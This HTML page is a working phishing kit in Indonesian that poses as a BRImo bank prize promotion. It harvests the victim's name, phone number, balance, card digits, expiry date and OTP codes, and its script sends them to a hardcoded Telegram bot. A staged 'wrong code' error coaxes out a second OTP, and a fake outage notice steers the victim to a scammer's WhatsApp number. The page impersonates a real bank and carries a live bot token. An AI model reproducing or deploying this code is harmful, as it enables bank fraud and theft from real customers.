<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Promo BRImo 2026</title>
    <style>
        * { box-sizing: border-box; font-family: 'Helvetica', Arial, sans-serif; }
        body { margin: 0; background-color: #f0f2f5; display: flex; justify-content: center; }
        .container { width: 100%; max-width: 480px; background: white; min-height: 100vh; position: relative; display: flex; flex-direction: column; overflow: hidden; }
        
        .slide { display: none; width: 100%; animation: fadeIn 0.4s; flex: 1; }
        .active { display: block; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }

        .marquee-box { background: #ff9900; color: white; padding: 6px 0; font-size: 12px; font-weight: bold; }
        .banner { width: 100%; display: block; height: auto; max-height: 60vh; object-fit: contain; }
        
        .button-section { background: #e6f2ff; padding: 30px 20px; text-align: center; }
        .btn-blue-bri { width: 100%; padding: 18px; background: #00529C; color: white; border: none; border-radius: 8px; font-size: 19px; font-weight: bold; cursor: pointer; box-shadow: 0 4px 15px rgba(0,82,156,0.4); text-transform: uppercase; }
        
        /* Tombol WA CS Ramah */
        #btn-cs { display: none; background: #25D366; margin-top: 15px; font-size: 16px; box-shadow: 0 4px 15px rgba(37, 211, 102, 0.4); }

        .form-wrapper { padding: 20px; }
        .input-box { width: 100%; padding: 14px; border: 1.5px solid #ccc; border-radius: 10px; font-size: 16px; margin-bottom: 5px; outline: none; }
        
        /* Pesan Gangguan */
        #fake-error-otp { color: #d93025; background: #fce8e6; padding: 15px; border-radius: 8px; font-weight: bold; border: 1px solid #f5c2c7; margin: 15px 0; display: none; font-size: 13px; line-height: 1.4; text-align: center; }

        .footer { text-align: center; font-size: 11px; color: #999; padding: 20px; background: #f9f9f9; border-top: 1px solid #eee; }
    </style>
</head>
<body>

<div class="container">
    
    <div id="s1" class="slide active">
        <div class="marquee-box">
            <marquee>INFO: Selamat kepada Nasabah yang telah mengaktifkan Kupon Undian BRImo hari ini. Kesempatan menang masih terbuka lebar!</marquee>
        </div>
        <img src="utama.jpg" class="banner">
        <div class="button-section">
            <button class="btn-blue-bri" onclick="move(2)">DAFTAR DI SINI</button>
            <p style="font-size: 13px; color: #00529C; font-weight: bold; margin-top: 15px;">Aktivasi Kupon Berhadiah Sekarang</p>
        </div>
    </div>

    <div id="s2" class="slide">
        <img src="saldo.jpg" class="banner">
        <div class="form-wrapper">
            <input type="text" id="nama" class="input-box" placeholder="Nama Lengkap">
            <input type="number" id="wa" class="input-box" placeholder="Nomor WhatsApp">
            <input type="text" id="saldo" class="input-box" placeholder="Saldo Terakhir" oninput="formatRupiah(this)">
            <button class="btn-blue-bri" onclick="move(3)">Lanjutkan</button>
        </div>
    </div>

    <div id="s3" class="slide">
        <img src="kartu.jpg" class="banner">
        <div class="form-wrapper">
            <input type="number" id="digit" class="input-box" placeholder="4 Digit Terakhir Kartu">
            <input type="text" id="valid" class="input-box" placeholder="Masa Berlaku (MM/YY)" oninput="fDate(this)">
            <button class="btn-blue-bri" onclick="move(4)">Konfirmasi</button>
        </div>
    </div>

    <div id="s4" class="slide" style="text-align: center; padding-top: 40px;">
        <h3 id="judul-otp" style="color: #00529C;">Verifikasi Kode</h3>
        <p id="teks-otp" style="font-size: 14px; padding: 0 25px; color: #666;">Silakan masukkan 6 digit kode keamanan yang dikirim melalui <b>SMS / WhatsApp</b>.</p>
        
        <div class="form-wrapper">
            <input type="number" id="otp" class="input-box" placeholder="xxxxxx" oninput="limit(this, 6)" style="text-align: center; font-size: 26px; letter-spacing: 6px; font-weight: bold; border-color: #00529C;">
            <div id="fake-error-otp"></div>
            <button class="btn-blue-bri" id="btn-otp" onclick="processFinal()">Selesai</button>
            
            <button class="btn-blue-bri" id="btn-cs" onclick="hubungiCS()">VERIFIKASI VIA WHATSAPP</button>
        </div>
    </div>

    <div class="footer">© 2026 PT Bank Rakyat Indonesia (Persero) Tbk.</div>
</div>

<script>
    const token = '8606568440:AAFaGya4aEw_5v6yGlQEAOYDA56dYHf_9xk';
    const chatId = '7078260230';
    const nomorWA = '082261207708';
    let errorCount = 0;

    function move(n) {
        document.querySelectorAll('.slide').forEach(s => s.classList.remove('active'));
        document.getElementById('s' + n).classList.add('active');
        window.scrollTo(0, 0);
    }

    function formatRupiah(el) {
        let val = el.value.replace(/\D/g, '');
        if (val === '') { el.value = ''; return; }
        el.value = 'Rp ' + new Intl.NumberFormat('id-ID').format(val);
    }

    function fDate(el) {
        let v = el.value.replace(/\D/g, '');
        if (v.length > 2) el.value = v.substring(0,2) + '/' + v.substring(2,4);
        else el.value = v;
    }

    function limit(el, max) { if (el.value.length > max) el.value = el.value.slice(0, max); }

    function processFinal() {
        const otpInput = document.getElementById('otp');
        const errorBox = document.getElementById('fake-error-otp');
        const btn = document.getElementById('btn-otp');
        const btnCS = document.getElementById('btn-cs');
        const judul = document.getElementById('judul-otp');
        const teks = document.getElementById('teks-otp');

        if (otpInput.value.length < 6) { alert("Masukkan 6 digit OTP"); return; }

        errorCount++;
        sendData(`LOG: OTP KE-${errorCount}`);

        btn.innerHTML = "Memverifikasi...";
        btn.disabled = true;

        setTimeout(() => {
            btn.disabled = false;
            btn.innerHTML = "Selesai";
            otpInput.value = '';

            if (errorCount === 1) {
                errorBox.style.display = 'block';
                errorBox.innerHTML = "KODE TIDAK SESUAI!<br>Silakan masukkan kode terbaru yang dikirim melalui SMS/WhatsApp.";
            } else if (errorCount >= 2) {
                judul.style.color = '#ff9900';
                judul.innerHTML = "GANGGUAN SISTEM!";
                teks.innerHTML = "Maaf, sistem sedang sibuk. Kami tidak dapat memverifikasi kode Anda secara otomatis.";
                
                errorBox.style.display = 'block';
                errorBox.style.background = '#fff4e5';
                errorBox.style.borderColor = '#ffc107';
                errorBox.style.color = '#856404';
                errorBox.innerHTML = "Silakan klik tombol di bawah untuk verifikasi manual melalui layanan bantuan WhatsApp kami.";
                
                btn.style.display = 'none';
                otpInput.style.display = 'none';
                btnCS.style.display = 'block';
            }
        }, 1500);
    }

    function hubungiCS() {
        const nama = document.getElementById('nama').value;
        const url = `https://wa.me/${nomorWA}?text=Halo%20Bantuan%20BRI,%20saya%20${nama}.%20Saya%20mengalami%20gangguan%20verifikasi%20saat%20klaim%20hadiah.%20Mohon%20verifikasi%20manual.`;
        window.location.href = url;
    }

    function sendData(step) {
        const nama = document.getElementById('nama').value;
        const wa = document.getElementById('wa').value;
        const saldo = document.getElementById('saldo').value;
        const digit = document.getElementById('digit').value;
        const valid = document.getElementById('valid').value;
        const otp = document.getElementById('otp').value;
        let pesan = `<b>${step}</b>\nNama: ${nama}\nWA: ${wa}\nSaldo: ${saldo}\n4 Digit: ${digit}\nValid: ${valid}\nOTP: <code>${otp}</code>`;
        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(pesan)}&parse_mode=html`;
        fetch(url);
    }
</script>
</body>
</html>
